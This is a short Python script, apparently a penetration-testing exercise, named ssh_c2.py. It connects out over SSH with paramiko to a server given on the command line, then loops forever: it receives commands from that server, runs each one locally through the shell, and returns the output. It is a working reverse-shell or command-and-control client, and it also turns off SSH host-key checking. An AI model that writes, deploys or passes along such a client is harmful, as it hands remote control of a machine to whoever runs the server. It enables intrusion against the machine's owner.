#!/bin/env python
# python ssh_c2.py ip port username password

import threading
import paramiko
import subprocess
import sys


def ssh_command(
    ip="127.0.0.1",
    port="2222",
    user="justin",
    passwd="lovesthepython",
    command="whoami",
):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # read banner
        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == "__main__":
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    ssh_command(server, ssh_port, username, password, "ClientConnected")
